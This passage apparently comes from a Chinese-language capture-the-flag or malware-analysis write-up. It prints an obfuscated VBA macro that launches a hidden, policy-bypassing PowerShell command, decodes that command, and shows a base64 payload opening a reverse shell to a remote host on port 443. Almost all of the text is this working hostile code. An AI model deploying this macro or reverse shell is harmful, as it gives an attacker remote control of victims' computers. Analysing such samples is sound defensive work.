_ytahenomter(&quot;4164414268414851416151426a414341415a514234414851415a51427941473441494142694147384162774273414341415577426f414738416477425841476b416267426b414738416477416f41476b41626742304143414161414268414734415a414273414755414c41416741476b41626742304143414163774230414745416441426c41436b41&quot;) &amp; _ytahenomter(&quot;4f77416e414473414451414b414745415a41426b4143304164414235414841415a5141674143304162674268414730415a5141674148634161514275414341414c5142744147554162514269414755416367416741435141644141674143304162674268414730415a51427a414841415951426a41475541494142754147454164414270414859415a51413741467341626742684148514161514232414755414c67423341476b416267426441446f414f674254414767416277423341466341615142754147514162774233414367414b41426241464d&quot;) &amp; _ytahenomter(&quot;416551427a414851415a5142744143344152414270414745415a774275414738416377423041476b415977427a4143344155414279414738415977426c41484d&quot;)vultiormen &#x3D; ytahenomter(&quot;416377426441446f414f674248414755416441424441485541636742794147554162674230414641416367427641474d&quot;) &amp; ytahenomter(&quot;415a51427a41484d414b4141704143414166414167414563415a5142304143304155414279414738415977426c41484d&quot;) &amp; _ytahenomter(&quot;4163774170414334415451426841476b416267425841476b416267426b4147384164774249414745416267426b414777415a514173414341414d&quot;) &amp; _ytahenomter(&quot;414170414473414451414b41476b415a514234414341414b41416741467341557742304148494161514275414563415851413641446f416167427641476b416267416f414363414a774173414341414b4142624148494152514248414755415741426441446f414f67424e414745415641426a414767415a514254414367414941416941436b414941416e414867414a774172414630414d&quot;) &amp; _ytahenomter(&quot;774178414673415241424a414777415441426c414567416377416b41437341585141784146734152414270414577415441426c414767416377416b414341414b41416d4148774149414170414451414d&quot;) &amp; ytahenomter(&quot;774178414673415241424a414777415441426c414567416377416b41437341585141784146734152414270414577415441426c414767416377416b414341414b41416d4148774149414170414451414d&quot;)moabehina &#x3D; ytahenomter(&quot;774264414649415151426f41474d4157774264414563416267424a414649415641427a414673414c41416e4148514157414271414363414b41426c41474d415151424d&quot;) &amp; ytahenomter(&quot;4146414152514253414334414b51416e414351414a774173414363416477427841476b414a77416f41475541517742424145774155414246414649414c674170414363414f774230414667414a774172414363416167427a41474d&quot;) &amp; _ytahenomter(&quot;414d41426b414638415a41417a4147774159674130414734414d&quot;) &amp; _ytahenomter(&quot;774266414441416367426a414451416251416e414373414a774237414763414a774172414363415951416e414373414a774273414759416441425941476f414941416e414373414a774139414445415877426e414745414a774172414363416241426d4148634163514270414363414b414169414377414a774175414363414c414167414363415567416e414373414a77427041456341534142554148514154774273414363414b77416e414755415a674230414363414941417041434141664141674147594162774279414555415151426a414567414c514276414549415367426c41474d&quot;) &amp; _ytahenomter(&quot;4156414167414873414a41426641433441566742424145774156514246414830414941417041436b4149414170414473414451414b41464d&quot;) &amp; _ytahenomter(&quot;4152514230414341414b414169414563414f414169414373414967426f414349414b5141674143674149414169414341414b51416741436b414e67417a41463041556742684147674159774262414377414a774279414745415767416e4145554159774268414777415541426c414649414c514167414451414d&quot;)hujilkomna &#x3D; ytahenomter(&quot;774264414649415951426f41474d415777417341436b414d&quot;) &amp; ytahenomter(&quot;41413141463041556742684147674159774262414373414f41413341463041556742684147674159774262414373414f5141304146304155674268414767415977426241436741494141674147554151774242414777416341424641464941597741744143414149414170414363414f774179414363414b77416e414534414a774172414363414d&quot;) &amp; _ytahenomter(&quot;51416e414373414a77423941484d4164514177414849414d77426e414363414b77416e414734414e41426b414638414d774279414451414a7741724143634158774179414534414d&quot;) &amp; _ytahenomter(&quot;5141674144304149414179414638415a774268414363414b77416e414777415a674279414363414b77416e414745415767416e414367414b4141674143674149414170414363414a77427541476b4154774271414330414a774234414363414b77426441444d&quot;)tuabnimne &#x3D; ytahenomter(&quot;414c414178414673414b51416f414563415467427041484941564142544147384164414175414555415977424f414755416367426c414559415a514253414841415251427a4145384151674253414555416467416b414341414b41416741433441494141694143414149414170414341414f77417441476f415477424a414734414941416f4143414162414254414341414b4141694146594151514253414349414b77416941456b4159514243414349414b77416941457741525141364147634149674172414349414f414249414349414b514167414341414b514175414659415151424d&quot;) &amp; _ytahenomter(&quot;414855415a514262414341414c514167414445414c674175414341414c514167414367414941416f4143414162414254414341414b4141694146594151514253414349414b77416941456b4159514243414349414b77416941457741525141364147634149674172414349414f414249414349414b514167414341414b514175414659415151424d&quot;) &amp; _ytahenomter(&quot;414855415a514175414577415a514275414763416441424941436b4158514167414877414941424a414755415741414e41416f414a4142774147454165514273414738415951426b414341415051416741434941536742424145494161674242414563416477424241474541555142434147774151514248414451415151426b414545415151426e414545415241417741454541535142424145494154774242414563415651424241475141647742424148514151514246414467415151425a414763415167427841454541527742564145454157514233414549414d&quot;) &amp; _ytahenomter(&quot;41424241454d415151424241465541647742434144554151514249414530415151426b41454541516742734145454152774177414545415441426e414549415477424241456341565142424147514151514242414855415151424741453041515142694148634151674271414545415277427a4145454157674252414549414d&quot;) &amp; _ytahenomter(&quot;4142424145674154514242414577415a774243414655415151424641453041515142564145454151674245414545415277423341454541595142524145494162414242414563414e4142424147514151514242414738415151424441456b415151424e4146454151514131414545415241424a414545415441426e414545416477424241454d&quot;)wuotamw &#x3D; ytahenomter(&quot;414e414242414530415a7742424148554151514245414555415151424e4148634151514235414545415177424a4145454154414242414545414d&quot;) &amp; ytahenomter(&quot;41424241455141555142424145304164774242414841415151424541484d&quot;) &amp; _ytahenomter(&quot;415151424b41454541516742364145454153414252414545415977426e4145494162414242414563415251424241474941555142424147634151514245414441415151424a4145454151514272414545415277424e414545415967424241454941634142424145634156514242414749415a77424341444141515142444144514151514253414863415167427341454541534142524145454156514233414549414d&quot;) &amp; _ytahenomter(&quot;414242414567415351424241466f41555142434147674151514248414441415151424c4145454151514277414545415241427a4145454156774233414549416151424241456741617742424147514151514243414777415151424741484d&quot;) &amp; _ytahenomter(&quot;4151514259414645415167426b4145454151774252414545415751426e414549414e514242414567415551424241466f415551424341486f41515142444145454151514251414645415151426e4145454152414242414545415441426e4145454164514242414551415751424241453441555142424144454151514245414530415151424f41464541516741344145454151774256414545415a5142334145454164774242414567414d&quot;) &amp; ytahenomter(&quot;414242414538416477424341444d&quot;)sjeldmajek &#x3D; ytahenomter(&quot;41515142484147634151514268414645415167427a41454541527742564145454153774242414545416277424241454d&quot;) &amp; _ytahenomter(&quot;415551424241474541555142424147634151514245414441415151424a4145454151514272414545415341424e414545415a4142424145494165514242414563415651424241466b415551424341485141515142444144514151514256414763415167427341454541527742464145454157674242414545416277424241454d&quot;) &amp; _ytahenomter(&quot;415551424241466b415a77424341445541515142494146454151514261414645415167423641454541517742334145454153514242414545416477424241454d&quot;) &amp; _ytahenomter(&quot;416477424241456b4151514242414773415151424841456b415151426c4146454151674177414545415277425641454541597742334145454164514242414555416477424241466f4155514243414855415151424841474d&quot;) &amp; ytahenomter(&quot;415151426b414545415167427641454541517742724145454153774252414545415a77424241454d414d&quot;) &amp; _ytahenomter(&quot;414242414749415a7742434147774151514244414545415151424e4145454151514277414545415341427a41454541547742334145454161774242414563415551424241466b41555142434144414151514248414555415151424a4145454151514135414545415177424241454541537742424145494154774242414563415651424241475141647742424148514151514246414467415151425a414763415167427841454541527742564145454157514233414549414d&quot;)afsyedlmen &#x3D; ytahenomter(&quot;41424241454d415151424241457741555142434146554151514249414773415151426a4145454151674273414545415251413041454541575142524145494164414242414563415651424241456b41515142434146514151514249414773415151426a4148634151674177414545415277425641454541596742524145454164514242414559415551424241466f41555142434144514151514249414645415151424d&quot;) &amp; ytahenomter(&quot;4147634151674243414545415267424e41454541555142334145494153674242414555416177424241464941555142434148554151514248414530415151426941486341516742724145454152774272414545415967426e414549416267424241454d&quot;) &amp; _ytahenomter(&quot;4161774242414577415a7742434145674151514248414655415151426b41454541516742554145454153414252414545415977426e4145494163414242414563414e41424241466f41647742424147384151514244414645415151425a414763415167413141454541534142524145454157674252414549416567424241454d&quot;) &amp; _ytahenomter(&quot;4164774242414530415151424241484d4151514244414545415151424b4145454151674277414545415177427241454541547742334145454161774242414567415451424241466f41555142434148554151514248414645415151425a414763415167426f414545415277424e4145454159514233414545415a774242414551414d&quot;) &amp; _ytahenomter(&quot;41424241456b4151514242414738415151424841477341515142614146454151674130414545415177424241454541536742424145494161774242414563415251424241475141515142434147674151514244414545415151424e4147634151514172414545415177425a4145454154514252414545415a774242414567416477424241456b41515142434146414151514249414655415151426b4145454151514230414545415267424e414545415a41424241454941655142424145634161774242414749415a7742434147344151514244414545415151424c4146454151514133414545415177425241454541597742334145494162414242414563414e41424241466f415151424341476b4151514248414555415151425a4148634151674279414545415241424a4145454153514242414545415a774242414551414d&quot;) &amp; _ytahenomter(&quot;41424241456b41515142424147734151514249414530415151426141464541516742314145454152774252414545415751426e414549416141424241456341545142424147454164774242414763415151424441484d&quot;) &amp; _ytahenomter(&quot;415151424a414545415151427041454541526742424145454156514233414545415a77424241454d415351424241456b41515142424148494151514244414545415151424c4145454151674233414545415341426a4145454157674242414545416341424241454d&quot;) &amp; _ytahenomter(&quot;414e414242414655415151424341476741515142494146454151514268414545415151426e414545415177427a41454541535142424145454161514242414551414e41424241456b415151424241476b415151424541484d&quot;) &amp; _ytahenomter(&quot;415151424b41454541516742364145454152774256414545415967426e4145494161774242414563415351424241475541555142434144414151514248414655415151424a4145454151514135414545415177424241454541537742424145494159674242414567415551424241466f41555142434144514151514249414645415151424d&quot;)eujrtabem &#x3D; ytahenomter(&quot;414763415167427341454541527741304145454157514233414549416467424241456341555142424147454155514243414855415151424841474d&quot;) &amp; ytahenomter(&quot;41515142594146454151514132414545415241427641454541555142524145494156414242414555415451424241464d&quot;) &amp; _ytahenomter(&quot;415551424341456f4151514244414773415151424d&quot;) &amp; _ytahenomter(&quot;41476341516742494145454152774256414545415a4142424145494151774242414567416177424241475141515142434147774151514249414530415151424c4145454151514272414545415341424e41454541576742524145494164514242414563415551424241466b415a7742434147674151514248414530415151426841486341515142354145454151774272414545415477423341454541617742424145674154514242414751415151424341486b4151514248414655415151425a4146454151674230414545415177413041454541566742334145494165514242414563416177424241475141515142434147774151514244414763415151424b41454541516742364145454152774256414545415967426e4145494161774242414563415351424241475541555142434144414151514248414655415151424d&quot;) &amp; _ytahenomter(&quot;41454541515142334145454151774233414545415367424241454941656742424145634156514242414749415a774243414773415151424841456b415151426c41464541516741774145454152774256414545415441426e41454941545142424145634156514242414749415a774243414734415151424941464541515142684145454151514277414545415241427a41454541536742424145494165674242414567415551424241474d&quot;) &amp; _ytahenomter(&quot;415a774243414777415151424841455541515142694146454151514231414545415251425a4145454159674242414549414d&quot;) &amp; ytahenomter(&quot;514242414567415451424241474541515142424147384151514244414773415151426d4146454151514133414545415177425241454541575142334145494163774242414563416177424241466f41555142434148554151514249414645415151424d&quot;) &amp; _ytahenomter(&quot;414763415167424541454541527742334145454159674233414549416567424241456341565142424145734151514242414841415151424541484d&quot;) &amp; ytahenomter(&quot;4151514169414130414367416b41474d&quot;) &amp; _ytahenomter(&quot;4149414139414341415777425441486b41637742304147554162514175414651415a514234414851414c67424641473441597742764147514161514275414763415851413641446f415651427541476b4159774276414751415a514175414563415a51423041464d&quot;) &amp; ytahenomter(&quot;416441427941476b416267426e414367415777425441486b4163774230414755416251417541454d&quot;) &amp; _ytahenomter(&quot;4162774275414859415a514279414851415851413641446f41526742794147384162514243414745416377426c414459414e4142544148514163674270414734415a77416f414351416341426841486b4162414276414745415a41417041436b414451414b41476b415a674167414367414a4142774147454165514273414738415951426b414341414c514274414745416441426a41476741494141694147674164414230414841414f67423841476741644142304148414163774136414349414b514167414873414451414b4143414149414167414341414a4142774147454165514273414738415951426b4143414150514167414367415467426c414863414c514250414749416167426c41474d&quot;) &amp; _ytahenomter(&quot;4164414167414349415467426c414851414c674258414755415967426a414777416151426c414734416441416941436b414c6742454147384164774275414777416277426841475141557742304148494161514275414763414b41416b41484141595142354147774162774268414751414b514137414130414367423941413041436742704147554165414167414351415977413741413d3d&quot;)x &#x3D; Shell(aeythrpom &amp; vultiormen &amp; moabehina &amp; hujilkomna &amp; tuabnimne &amp; wuotamw &amp; sjeldmajek &amp; afsyedlmen &amp; eujrtabem)End SubPrivate Function ytahenomter(ByVal ncjdmileoa As String) As StringDim bycamliooa As LongFor bycamliooa &#x3D; 1 To Len(ncjdmileoa) Step 2ytahenomter &#x3D; ytahenomter &amp; Chr$(Val(&quot;&amp;H&quot; &amp; Mid$(ncjdmileoa, bycamliooa, 2)))Next bycamliooaDebug.Print (ytahenomter)End Function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加个监视<code>Debug.Print ()</code></p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -noexit -w hidden -enc  JAB0ACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoAFwAIgB1AHMAZQByADMAMgAuAGQAbABsAFwAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwBoAG8AdwBXAGkAbgBkAG8AdwAoAGkAbgB0ACAAaABhAG4AZABsAGUALAAgAGkAbgB0ACAAcwB0AGEAdABlACkAOwAnADsADQAKAGEAZABkAC0AdAB5AHAAZQAgAC0AbgBhAG0AZQAgAHcAaQBuACAALQBtAGUAbQBiAGUAcgAgACQAdAAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABuAGEAdABpAHYAZQA7AFsAbgBhAHQAaQB2AGUALgB3AGkAbgBdADoAOgBTAGgAbwB3AFcAaQBuAGQAbwB3ACgAKABbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0AFAAcgBvAGMAZQBzAHMAKAApACAAfAAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwApAC4ATQBhAGkAbgBXAGkAbgBkAG8AdwBIAGEAbgBkAGwAZQAsACAAMAApADsADQAKAGkAZQB4ACAAKAAgAFsAUwB0AHIAaQBuAEcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKABbAHIARQBHAGUAWABdADoAOgBNAGEAVABjAGgAZQBTACgAIAAiACkAIAAnAHgAJwArAF0AMwAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAMwAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAMwBdAFIAQQBoAGMAWwBdAEcAbgBJAFIAVABzAFsALAAnAHQAWABqACcAKABlAGMAQQBMAFAARQBSAC4AKQAnACQAJwAsACcAdwBxAGkAJwAoAGUAQwBBAEwAUABFAFIALgApACcAOwB0AFgAJwArACcAagBzAGMAMABkAF8AZAAzAGwAYgA0AG4AMwBfADAAcgBjADQAbQAnACsAJwB7AGcAJwArACcAYQAnACsAJwBsAGYAdABYAGoAIAAnACsAJwA9ADEAXwBnAGEAJwArACcAbABmAHcAcQBpACcAKAAiACwAJwAuACcALAAgACcAUgAnACsAJwBpAEcASABUAHQATwBsACcAKwAnAGUAZgB0ACcAIAApACAAfAAgAGYAbwByAEUAQQBjAEgALQBvAEIASgBlAGMAVAAgAHsAJABfAC4AVgBBAEwAVQBFAH0AIAApACkAIAApADsADQAKAFMARQB0ACAAKAAiAEcAOAAiACsAIgBoACIAKQAgACgAIAAiACAAKQAgACkANgAzAF0AUgBhAGgAYwBbACwAJwByAGEAWgAnAEUAYwBhAGwAUABlAFIALQAgADQAMwBdAFIAYQBoAGMAWwAsACkAMAA1AF0AUgBhAGgAYwBbACsAOAA3AF0AUgBhAGgAYwBbACsAOQA0AF0AUgBhAGgAYwBbACgAIAAgAGUAQwBBAGwAcABFAFIAYwAtACAAIAApACcAOwAyACcAKwAnAE4AJwArACcAMQAnACsAJwB9AHMAdQAwAHIAMwBnACcAKwAnAG4ANABkAF8AMwByADQAJwArACcAXwAyAE4AMQAgAD0AIAAyAF8AZwBhACcAKwAnAGwAZgByACcAKwAnAGEAWgAnACgAKAAgACgAIAApACcAJwBuAGkATwBqAC0AJwB4ACcAKwBdADMALAAxAFsAKQAoAEcATgBpAHIAVABTAG8AdAAuAEUAYwBOAGUAcgBlAEYAZQBSAHAARQBzAE8AQgBSAEUAdgAkACAAKAAgAC4AIAAiACAAIAApACAAOwAtAGoATwBJAG4AIAAoACAAbABTACAAKAAiAFYAQQBSACIAKwAiAEkAYQBCACIAKwAiAEwARQA6AGcAIgArACIAOABIACIAKQAgACAAKQAuAFYAQQBMAHUAZQBbACAALQAgADEALgAuACAALQAgACgAIAAoACAAbABTACAAKAAiAFYAQQBSACIAKwAiAEkAYQBCACIAKwAiAEwARQA6AGcAIgArACIAOABIACIAKQAgACAAKQAuAFYAQQBMAHUAZQAuAEwAZQBuAGcAdABIACkAXQAgAHwAIABJAGUAWAANAAoAJABwAGEAeQBsAG8AYQBkACAAPQAgACIASgBBAEIAagBBAEcAdwBBAGEAUQBCAGwAQQBHADQAQQBkAEEAQQBnAEEARAAwAEEASQBBAEIATwBBAEcAVQBBAGQAdwBBAHQAQQBFADgAQQBZAGcAQgBxAEEARwBVAEEAWQB3AEIAMABBAEMAQQBBAFUAdwBCADUAQQBIAE0AQQBkAEEAQgBsAEEARwAwAEEATABnAEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBiAHcAQgBqAEEARwBzAEEAWgBRAEIAMABBAEgATQBBAEwAZwBCAFUAQQBFAE0AQQBVAEEAQgBEAEEARwB3AEEAYQBRAEIAbABBAEcANABBAGQAQQBBAG8AQQBDAEkAQQBNAFEAQQA1AEEARABJAEEATABnAEEAdwBBAEMANABBAE0AZwBBAHUAQQBEAEUAQQBNAHcAQQB5AEEAQwBJAEEATABBAEEAMABBAEQAUQBBAE0AdwBBAHAAQQBEAHMAQQBKAEEAQgB6AEEASABRAEEAYwBnAEIAbABBAEcARQBBAGIAUQBBAGcAQQBEADAAQQBJAEEAQQBrAEEARwBNAEEAYgBBAEIAcABBAEcAVQBBAGIAZwBCADAAQQBDADQAQQBSAHcAQgBsAEEASABRAEEAVQB3AEIAMABBAEgASQBBAFoAUQBCAGgAQQBHADAAQQBLAEEAQQBwAEEARABzAEEAVwB3AEIAaQBBAEgAawBBAGQAQQBCAGwAQQBGAHMAQQBYAFEAQgBkAEEAQwBRAEEAWQBnAEIANQBBAEgAUQBBAFoAUQBCAHoAQQBDAEEAQQBQAFEAQQBnAEEARABBAEEATABnAEEAdQBBAEQAWQBBAE4AUQBBADEAQQBEAE0AQQBOAFEAQgA4AEEAQwBVAEEAZQB3AEEAdwBBAEgAMABBAE8AdwBCADMAQQBHAGcAQQBhAFEAQgBzAEEARwBVAEEASwBBAEEAbwBBAEMAUQBBAGEAUQBBAGcAQQBEADAAQQBJAEEAQQBrAEEASABNAEEAZABBAEIAeQBBAEcAVQBBAFkAUQBCAHQAQQBDADQAQQBVAGcAQgBsAEEARwBFAEEAWgBBAEEAbwBBAEMAUQBBAFkAZwBCADUAQQBIAFEAQQBaAFEAQgB6AEEAQwB3AEEASQBBAEEAdwBBAEMAdwBBAEkAQQBBAGsAQQBHAEkAQQBlAFEAQgAwAEEARwBVAEEAYwB3AEEAdQBBAEUAdwBBAFoAUQBCAHUAQQBHAGMAQQBkAEEAQgBvAEEAQwBrAEEASwBRAEEAZwBBAEMAMABBAGIAZwBCAGwAQQBDAEEAQQBNAEEAQQBwAEEASABzAEEATwB3AEEAawBBAEcAUQBBAFkAUQBCADAAQQBHAEUAQQBJAEEAQQA5AEEAQwBBAEEASwBBAEIATwBBAEcAVQBBAGQAdwBBAHQAQQBFADgAQQBZAGcAQgBxAEEARwBVAEEAWQB3AEIAMABBAEMAQQBBAEwAUQBCAFUAQQBIAGsAQQBjAEEAQgBsAEEARQA0AEEAWQBRAEIAdABBAEcAVQBBAEkAQQBCAFQAQQBIAGsAQQBjAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEYAUQBBAFoAUQBCADQAQQBIAFEAQQBMAGcAQgBCAEEARgBNAEEAUQB3AEIASgBBAEUAawBBAFIAUQBCAHUAQQBHAE0AQQBiAHcAQgBrAEEARwBrAEEAYgBnAEIAbgBBAEMAawBBAEwAZwBCAEgAQQBHAFUAQQBkAEEAQgBUAEEASABRAEEAYwBnAEIAcABBAEcANABBAFoAdwBBAG8AQQBDAFEAQQBZAGcAQgA1AEEASABRAEEAWgBRAEIAegBBAEMAdwBBAE0AQQBBAHMAQQBDAEEAQQBKAEEAQgBwAEEAQwBrAEEATwB3AEEAawBBAEgATQBBAFoAUQBCAHUAQQBHAFEAQQBZAGcAQgBoAEEARwBNAEEAYQB3AEEAZwBBAEQAMABBAEkAQQBBAG8AQQBHAGsAQQBaAFEAQgA0AEEAQwBBAEEASgBBAEIAawBBAEcARQBBAGQAQQBCAGgAQQBDAEEAQQBNAGcAQQArAEEAQwBZAEEATQBRAEEAZwBBAEgAdwBBAEkAQQBCAFAAQQBIAFUAQQBkAEEAQQB0AEEARgBNAEEAZABBAEIAeQBBAEcAawBBAGIAZwBCAG4AQQBDAEEAQQBLAFEAQQA3AEEAQwBRAEEAYwB3AEIAbABBAEcANABBAFoAQQBCAGkAQQBHAEUAQQBZAHcAQgByAEEARABJAEEASQBBAEEAZwBBAEQAMABBAEkAQQBBAGsAQQBIAE0AQQBaAFEAQgB1AEEARwBRAEEAWQBnAEIAaABBAEcATQBBAGEAdwBBAGcAQQBDAHMAQQBJAEEAQQBpAEEARgBBAEEAVQB3AEEAZwBBAEMASQBBAEkAQQBBAHIAQQBDAEEAQQBLAEEAQgB3AEEASABjAEEAWgBBAEEAcABBAEMANABBAFUAQQBCAGgAQQBIAFEAQQBhAEEAQQBnAEEAQwBzAEEASQBBAEEAaQBBAEQANABBAEkAQQBBAGkAQQBEAHMAQQBKAEEAQgB6AEEARwBVAEEAYgBnAEIAawBBAEcASQBBAGUAUQBCADAAQQBHAFUAQQBJAEEAQQA5AEEAQwBBAEEASwBBAEIAYgBBAEgAUQBBAFoAUQBCADQAQQBIAFEAQQBMAGcAQgBsAEEARwA0AEEAWQB3AEIAdgBBAEcAUQBBAGEAUQBCAHUAQQBHAGMAQQBYAFEAQQA2AEEARABvAEEAUQBRAEIAVABBAEUATQBBAFMAUQBCAEoAQQBDAGsAQQBMAGcAQgBIAEEARwBVAEEAZABBAEIAQwBBAEgAawBBAGQAQQBCAGwAQQBIAE0AQQBLAEEAQQBrAEEASABNAEEAWgBRAEIAdQBBAEcAUQBBAFkAZwBCAGgAQQBHAE0AQQBhAHcAQQB5AEEAQwBrAEEATwB3AEEAawBBAEgATQBBAGQAQQBCAHkAQQBHAFUAQQBZAFEAQgB0AEEAQwA0AEEAVgB3AEIAeQBBAEcAawBBAGQAQQBCAGwAQQBDAGcAQQBKAEEAQgB6AEEARwBVAEEAYgBnAEIAawBBAEcASQBBAGUAUQBCADAAQQBHAFUAQQBMAEEAQQB3AEEAQwB3AEEASgBBAEIAegBBAEcAVQBBAGIAZwBCAGsAQQBHAEkAQQBlAFEAQgAwAEEARwBVAEEATABnAEIATQBBAEcAVQBBAGIAZwBCAG4AQQBIAFEAQQBhAEEAQQBwAEEARABzAEEASgBBAEIAegBBAEgAUQBBAGMAZwBCAGwAQQBHAEUAQQBiAFEAQQB1AEEARQBZAEEAYgBBAEIAMQBBAEgATQBBAGEAQQBBAG8AQQBDAGsAQQBmAFEAQQA3AEEAQwBRAEEAWQB3AEIAcwBBAEcAawBBAFoAUQBCAHUAQQBIAFEAQQBMAGcAQgBEAEEARwB3AEEAYgB3AEIAegBBAEcAVQBBAEsAQQBBAHAAQQBEAHMAQQAiAA0ACgAkAGMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAcABhAHkAbABvAGEAZAApACkADQAKAGkAZgAgACgAJABwAGEAeQBsAG8AYQBkACAALQBtAGEAdABjAGgAIAAiAGgAdAB0AHAAOgB8AGgAdAB0AHAAcwA6ACIAKQAgAHsADQAKACAAIAAgACAAJABwAGEAeQBsAG8AYQBkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgACIATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAAiACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAkAHAAYQB5AGwAbwBhAGQAKQA7AA0ACgB9AA0ACgBpAGUAeAAgACQAYwA7AA&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转base64</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">$t &#x3D; &#39;[DllImport(\&quot;user32.dll\&quot;)] public static extern bool ShowWindow(int handle, int state);&#39;;add-type -name win -member $t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);iex ( [StrinG]::join(&#39;&#39;, ([rEGeX]::MaTcheS( &quot;) &#39;x&#39;+]31[DIlLeHs$+]1[DiLLehs$ (&amp;| )431[DIlLeHs$+]1[DiLLehs$ (&amp;| )43]RAhc[]GnIRTs[,&#39;tXj&#39;(ecALPER.)&#39;$&#39;,&#39;wqi&#39;(eCALPER.)&#39;;tX&#39;+&#39;jsc0d_d3lb4n3_0rc4m&#39;+&#39;&#123;g&#39;+&#39;a&#39;+&#39;lftXj &#39;+&#39;&#x3D;1_ga&#39;+&#39;lfwqi&#39;(&quot;,&#39;.&#39;, &#39;R&#39;+&#39;iGHTtOl&#39;+&#39;eft&#39; ) | forEAcH-oBJecT &#123;$_.VALUE&#125; )) );SEt (&quot;G8&quot;+&quot;h&quot;) ( &quot; ) )63]Rahc[,&#39;raZ&#39;EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )&#39;;2&#39;+&#39;N&#39;+&#39;1&#39;+&#39;&#125;su0r3g&#39;+&#39;n4d_3r4&#39;+&#39;_2N1 &#x3D; 2_ga&#39;+&#39;lfr&#39;+&#39;aZ&#39;(( ( )&#39;&#39;niOj-&#39;x&#39;+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . &quot;  ) ;-jOIn ( lS (&quot;VAR&quot;+&quot;IaB&quot;+&quot;LE:g&quot;+&quot;8H&quot;)  ).VALue[ - 1.. - ( ( lS (&quot;VAR&quot;+&quot;IaB&quot;+&quot;LE:g&quot;+&quot;8H&quot;)  ).VALue.LengtH)] | IeX$payload &#x3D; &quot;JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMA